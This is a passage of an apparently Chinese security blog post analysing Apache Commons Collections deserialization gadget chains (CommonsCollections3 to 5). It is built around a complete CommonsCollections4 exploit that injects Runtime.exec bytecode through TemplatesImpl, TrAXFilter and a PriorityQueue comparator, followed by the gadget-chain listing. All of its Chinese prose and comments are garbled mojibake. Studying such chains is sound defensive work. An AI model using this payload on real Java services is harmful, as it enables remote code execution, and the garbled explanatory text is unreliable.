</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>input</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>Class</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InstantiateTransformer: Input object was not an instanceof Class, it was a &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=p>(</span><span class=n>input</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=s>&#34;null object&#34;</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getName</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Constructor</span><span class=w> </span><span class=n>con</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>((</span><span class=n>Class</span><span class=p>)</span><span class=n>input</span><span class=p>).</span><span class=na>getConstructor</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>iParamTypes</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=n>con</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>iArgs</span><span class=p>);</span><span class=c1>//1 æ¼æ´åˆ©ç”¨ç‚¹</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>NoSuchMethodException</span><span class=w> </span><span class=n>var6</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InstantiateTransformer: The constructor must exist and be public &#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>InstantiationException</span><span class=w> </span><span class=n>var7</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InstantiateTransformer: InstantiationException&#34;</span><span class=p>,</span><span class=w> </span><span class=n>var7</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IllegalAccessException</span><span class=w> </span><span class=n>var8</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InstantiateTransformer: Constructor must be public&#34;</span><span class=p>,</span><span class=w> </span><span class=n>var8</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>InvocationTargetException</span><span class=w> </span><span class=n>var9</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FunctorException</span><span class=p>(</span><span class=s>&#34;InstantiateTransformer: Constructor threw an exception&#34;</span><span class=p>,</span><span class=w> </span><span class=n>var9</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>this.iArgsçš„å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„templatesImplï¼Œç¨‹åºåœ¨æ³¨é‡Š1å‡ºå®é™…æ‰§è¡Œçš„æ˜¯templatesImpl.newTransformer()ï¼Œåé¢çš„åˆ©ç”¨åŸç†å’ŒCommonsCollections2ç±»ä¼¼ï¼Œä¸å†èµ˜è¿°ã€‚</p><h2 id=commonscollections4>CommonsCollections4</h2><h3 id=ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-3>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</h3><p>commons-collections4 4.0</p><h3 id=expå±•ç¤º-4>Expå±•ç¤º</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w>  </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javassist.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.Transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.comparators.TransformingComparator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections4.functors.InstantiateTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.xml.transform.Templates</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.util.PriorityQueue</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>CommonsCollections4</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>TemplatesImpl</span><span class=o>=</span><span class=s>&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>classPool</span><span class=o>=</span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>classPool</span><span class=p>.</span><span class=na>appendClassPath</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>payload</span><span class=o>=</span><span class=n>classPool</span><span class=p>.</span><span class=na>makeClass</span><span class=p>(</span><span class=s>&#34;CommonsCollections44444444&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>setSuperclass</span><span class=p>(</span><span class=n>classPool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>AbstractTranslet</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=p>.</span><span class=na>makeClassInitializer</span><span class=p>().</span><span class=na>setBody</span><span class=p>(</span><span class=s>&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>bytes</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>payload</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>templates</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>TemplatesImpl</span><span class=p>).</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{}).</span><span class=na>newInstance</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=o>=</span><span class=n>templates</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_bytecodes&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[][]</span><span class=p>{</span><span class=n>bytes</span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>name</span><span class=o>=</span><span class=n>templates</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;_name&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>name</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>name</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>templates</span><span class=p>,</span><span class=s>&#34;test&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Transformer</span><span class=o>[]</span><span class=w> </span><span class=n>trans</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Transformer</span><span class=o>[]</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>ConstantTransformer</span><span class=p>(</span><span class=n>TrAXFilter</span><span class=p>.</span><span class=na>class</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>new</span><span class=w> </span><span class=n>InstantiateTransformer</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>new</span><span class=w> </span><span class=n>Class</span><span class=o>[]</span><span class=p>{</span><span class=n>Templates</span><span class=p>.</span><span class=na>class</span><span class=p>},</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=k>new</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=p>{</span><span class=n>templates</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=c1>// ä¸»è¦æ˜¯è¿™é‡Œçš„å˜åŒ–</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ChainedTransformer</span><span class=w> </span><span class=n>chain</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ChainedTransformer</span><span class=p>(</span><span class=n>trans</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>TransformingComparator</span><span class=w> </span><span class=n>transCom</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>TransformingComparator</span><span class=p>(</span><span class=n>chain</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>PriorityQueue</span><span class=w> </span><span class=n>queue</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>(</span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>queue</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>com</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PriorityQueue</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;comparator&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>com</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>com</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>queue</span><span class=p>,</span><span class=n>transCom</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectOutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectOutputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>queue</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>inputStream</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;test.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>inputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=expæ„é€ åˆ†æ-5>Expæ„é€ åˆ†æ</h3><p>å…¶å®å°±æ˜¯CommonsCollections2å’ŒCommonsCollections3çš„ç»„åˆ</p><h4 id=åˆ©ç”¨é“¾å±•ç¤º-3>åˆ©ç”¨é“¾å±•ç¤º</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Gadget</span><span class=w> </span><span class=n>chain</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ObjectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>PriorityQueue</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=p>...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>					</span><span class=n>TransformingComparator</span><span class=p>.</span><span class=na>compare</span><span class=p>()</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>						</span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    		</span><span class=n>ConstantTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        		</span><span class=n>InstantiateTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                            		</span><span class=n>TemplatesImpl</span><span class=p>.</span><span class=na>newTransformer</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>æ³¨é‡Š1ä¹‹å‰æ˜¯CommonsCollections2çš„åˆ©ç”¨ã€‚</p><p>åœ¨TransformingComparator.compare()ä¸­è§¦å‘this.transformer.transform(obj1)ï¼Œåé¢å°±æ˜¯CommonsCollections3çš„åˆ©ç”¨ã€‚</p><h3 id=é—®é¢˜è¡¥å……-2>é—®é¢˜è¡¥å……</h3><h4 id=æ˜¯å¦èƒ½ç”¨treebagtreemapæ„é€ >æ˜¯å¦èƒ½ç”¨TreeBag&amp;TreeMapæ„é€ </h4><p>Qï¼š</p><p>æ˜¯å¦èƒ½ç±»ä¼¼CommonsCollections2ä¸€æ ·ï¼Œåˆ©ç”¨TreeBag&amp;TreeMapæ„é€ å‘¢ï¼Ÿ</p><p>Aï¼š</p><p>æˆ‘è§‰å¾—å¾ˆéš¾ï¼Œç†ç”±å¦‚ä¸‹ï¼š</p><p>â€‹<code>tb.add(templatesImpl)</code>â€‹ä¼šè§¦å‘æˆ‘ä»¬çš„æ¶æ„æ’åºã€‚</p><p>å› æ­¤CommonsCollections2ä¸­ï¼Œå…ˆä½¿ç”¨toStringä½œä¸ºå…¥å‚æ„é€ ï¼Œä½¿ä»£ç è¿è¡Œé€šè¿‡<code>tb.add(templatesImpl)</code>â€‹ï¼Œåé¢å†é€šè¿‡åå°„æŠŠtoStringæ”¹ä¸ºnewTransformerã€‚</p><p>è€Œåœ¨æ­¤å¤„å´å¾ˆéš¾å®ç°ã€‚</p><p>æˆ‘å°è¯•ä¸ä½¿ç”¨<code>tb.add(templatesImpl)</code>â€‹ï¼Œè€Œä½¿ç”¨åå°„ç»™sizeå’Œmapèµ‹å€¼ï¼Œè¿™æ ·å¯ä»¥è§„é¿addçš„æ‰§è¡Œï¼Œä½†å¯ä»¥æŠŠç­‰åŒçš„çŠ¶æ€èµ‹ç»™å®ä¾‹ã€‚</p><p>sizeå®¹æ˜“è§£å†³ï¼Œä½†æ˜¯mapå´å¾ˆéš¾è§£å†³ã€‚</p><p>æºç ä¸­mapçš„å®šä¹‰å¦‚ä¸‹ï¼š</p><p>â€‹<code> private transient Map&lt;E, MutableInteger> map;</code>â€‹</p><p>MutableIntegeræ˜¯AbstractMapBagå†…éƒ¨çš„ä¸€ä¸ªprotectedç±»ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>protected</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>class</span> <span class=nc>MutableInteger</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>protected</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>MutableInteger</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>equals</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>obj</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>MutableInteger</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>return</span><span class=w> </span><span class=p>((</span><span class=n>MutableInteger</span><span class=p>)</span><span class=n>obj</span><span class=p>).</span><span class=na>value</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>hashCode</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>è¿™å°±å¾ˆéš¾æäº†ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•ä»å¤–éƒ¨è·å–åˆ°MutableIntegerã€‚</p><p>å› æ­¤æˆ‘è®¤ä¸ºå¾ˆéš¾å†ä½¿ç”¨TreeBag&amp;TreeMapæ„é€ äº†ã€‚</p><h2 id=commonscollections5>CommonsCollections5</h2><h3 id=ç‰ˆæœ¬é€‚ç”¨èŒƒå›´-4>ç‰ˆæœ¬é€‚ç”¨èŒƒå›´</h3><p>Commons-Collections 3.1-3.2.1</p><p>jdk without a security manager</p><h3 id=expå±•ç¤º-5>Expå±•ç¤º</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.Transformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ChainedTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.ConstantTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.functors.InvokerTransformer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.commons.collections.map.LazyMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>javax.management.BadAttributeValueExpException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>java.io.FileOutputStream</span><span class=p>;</span><span class=w>
